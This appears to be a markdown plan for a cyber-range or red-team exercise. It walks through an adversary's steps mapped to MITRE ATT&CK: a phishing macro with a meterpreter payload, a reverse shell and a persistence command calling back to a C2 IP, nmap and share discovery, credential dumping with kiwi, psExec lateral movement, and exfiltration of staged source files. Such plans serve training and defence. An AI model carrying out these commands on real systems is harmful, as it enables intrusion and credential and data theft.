# Scenario-1

## Web Server Setup
1. Download Scenario git project
2. Use `Copy-VMGuestfile` to copy the files in www to c:\inetpub\wwwroot\
`Calc.exe` is going to be the software renamed

## Domain set-up 

# Scenario-2
## Attacker Scheme of Manuever 

### Initial Access https://attack.mitre.org/techniques/T1566/001/
#### Spear phishing attachment
1. Adversary spear phishes [user x] and gains access to their system. Sends phishing email to [user x] with a file attached including a malicious macro with an embedded meterpreter payload
Win7 

### Execution https://attack.mitre.org/techniques/T1204/002 or https://attack.mitre.org/techniques/T1059/005/
#### Visual Basic or Malicious File
3. User opens email, downloads attachment to C:\users\[user x windows account]\downloads
4.  [User x] opens PDF from file explorer , enables content, and executes the malicious macro

### Adversary establishes C2 https://attack.mitre.org/techniques/T1071/001
#### Maybe Http
1. Adversary establishes a reverse TCP connection from [user x IP] to [adversary C2 IP] via metetpreter shell to destination port [y]. Adversary leaves this connection open, no call back.

### Adversary establishes persistence https://attack.mitre.org/techniques/T1547/001
`run persistence -U -i 5 -p 443 -r {192.168.1.71}`
##### vbs for execution and runkey for persistence
1. Adversary uses the persistence module in meterpreter to establish persistence. Does not modify the default location or name of the .vbs dropped onto [user x] system

### Defense Evasion
None (n00b hax0r)

### Discovery https://attack.mitre.org/techniques/T1083
#### File Discovery 
Adversary is looking for files pertaining to the VicCash codebase on the local host
Adversary dir walks common  file storage directories on [user x] host looking for keywords pertaining to the VicCash codebase
Adversary is looking to see if [user x] is mapped to the fileserver already
Adversary reviews current mapped shares on [user x] system
`net use `
dir /s /b /a \\fs\share
Adversary is looking  for  a way to laterally move onto the  file server. 
Adversary performs network discovery to find potential lateral movement targets

### Discovery https://attack.mitre.org/techniques/T1018
#### Network Discovery 
nmap -F [IP]/24
Adversary nMaps the subnet [user x] is on	
Adversary nMaps any additional subnets of interest based on routes discovered in [user x] arp cache / route table

#### Attempt Logon
Adversary finds the target, but does not have the privileges required to psExec to the target
	
### Cred Access
Adversary is attempting to harvest domain admin credentials
Adversary uses kiwi to dump hashes	
Adversary finds the domain admin's creds on [user x's] system

Privilege Escalation/Lateral Movement
Adversary escalates privileges and laterally moves to file server
Adversary uses psExec to connect to the fileserver using the previously acquired domain admin creds
	
### Discovery
Adversary discovers VicCash codebase
Adversary dir walks common  file storage directories on file server looking for keywords pertaining to the VicCash codebase
Adversary finds the files VicCash_Build-9.6.cpp, VicCash_Build-9.6.exe, VicCash_Build-9.6.HxC, VicCash_Build-9.6.map located in [fileserver hostname]\\VicCashFS\VicCashCodeBaseFiles\Production\
		
### Collection
Adversary stages the files for exfil on initial victim host
Adversary downloads the files from the fileserver to [user x] host via meterpreter download to C:\users\[user x]\staging-files\
Adversary zips the files into a .zip file called badguyexfildocs.zip

### Exfiltration and Egress
Adversary exfils the files to their C2
Adversary uploads the files from [user x] system to their c2 domain via meterpreter
Adversary egresses the network
Adversary exits their session on the fileserver	
Adversary exits their session on [user x]
		
# WINNING

